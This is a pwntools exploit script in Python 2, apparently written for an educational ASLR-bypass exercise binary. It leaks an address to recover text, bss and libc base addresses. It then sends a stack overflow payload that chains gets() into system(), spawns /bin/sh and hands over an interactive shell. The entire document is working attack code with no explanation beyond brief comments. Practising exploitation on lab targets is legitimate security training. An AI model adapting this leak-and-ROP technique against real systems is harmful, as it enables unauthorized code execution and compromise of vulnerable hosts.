last#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template /levels/lecture/aslr/aslr_leak2
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('/levels/lecture/aslr/aslr_leak2')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR

TRIGGER_LEAK = 'A' * 16  

def start(argv=[TRIGGER_LEAK], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
break *0x{exe.symbols.main:x}
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

TEXT_OFFSET = -0x210
BSS_OFFSET  = 0x1a20
LIBC_OFFSET = -0x1c61f0
SYST_OFFSET = 0x28d70
GETS_OFFSET = 0x4d8b0

COMMAND = "/bin/sh"

a = io.recvuntil("Leaky buffer: " + TRIGGER_LEAK)

leaked_addr = u32(io.recv(4))

text_base = leaked_addr + TEXT_OFFSET
bss_base  = text_base + BSS_OFFSET
libc_base = text_base + LIBC_OFFSET

system = libc_base + SYST_OFFSET
gets   = libc_base + GETS_OFFSET

log.info("Leaked address: " + hex(leaked_addr))
log.info("Retrieved .text: " + hex(text_base))
log.info("Retrieved .bss: " + hex(bss_base))
log.info("Retrieved .text in libc: " + hex(libc_base))
log.info("Retrieved system(): " + hex(system))
log.info("Retrieved gets(): " + hex(gets))


          #OVERFLOW  gets()  --ra--> system()   gets arg         system arg
payload = 'A' * 28 + p32(gets) + p32(system) + p32(bss_base) + p32(bss_base) + "\n"

with log.progress("Sending payload") as p:
    log.indented("Sending rop chain: system(gets())")
    io.send(payload)
    log.indented("Sending command...")
    io.send(COMMAND + '\n')
    p.success("done")

io.clean()
io.interactive()
